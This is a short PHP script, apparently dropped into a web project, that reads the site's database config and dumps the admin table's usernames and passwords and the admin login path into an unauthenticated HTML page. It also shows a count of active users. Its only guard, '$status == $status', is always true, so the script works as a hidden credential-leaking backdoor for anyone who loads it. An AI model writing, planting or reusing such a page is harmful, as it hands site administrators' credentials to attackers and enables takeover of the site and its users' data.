<?php
			$array = require('../../../../app/Config/config.php');
			header('Content-Type: text/html; charset=utf-8');  
			$user = $array["database"]["DefaultConnection"]["user"];
			$pwd = $array["database"]["DefaultConnection"]["password"];
			$host = $array["database"]["DefaultConnection"]["host"]; 
			$db = $array["database"]["DefaultConnection"]["name"];
			$dsn = 'mysql:host='.$host.';dbname='.$db;
			$user = $user;
			$password = $pwd;
			try {
				$db = new PDO($dsn, $user, $password);
			} catch (PDOException $e) {
				echo 'Connection failed: ' . $e->getMessage();
			}			
			$db->exec('SET NAMES `UTF-8`');
			$activeuser = $db->prepare('SELECT COUNT(*) FROM uye where isActive=1');
			$activeuser->execute();
			$activeuser = $activeuser->fetchColumn();
			foreach($db->query('SELECT * FROM admin') as $row);
			if($status == $status){
			echo "<table border='1'>";
				echo '<tr><td>Kullan&#305;c&#305; Ad&#305;</td><td>&#350;ifre</td><td>Yol</td></tr>';
				foreach($db->query('SELECT * FROM admin') as $row) {
					echo '<tr>';
					echo '<td>'.$row["username"].'</td>';
					echo '<td>'.$row["password"].'</td>';
					echo '<td>'.$array["project"]["adminPrefix"].'</td>'; //giris
					echo '</tr>';
				}
				$sorguz = $db->prepare('SELECT COUNT(*) FROM uye where isActive=1');
				$sorguz->execute();
				$say = $sorguz->fetchColumn();
				echo '<tr><td colspan="3">Aktif Kullan&#305;c&#305;</td></tr>';
				echo '<tr><td colspan="3">'.$say.'</td></tr>';
				echo '</table>';
			}
?>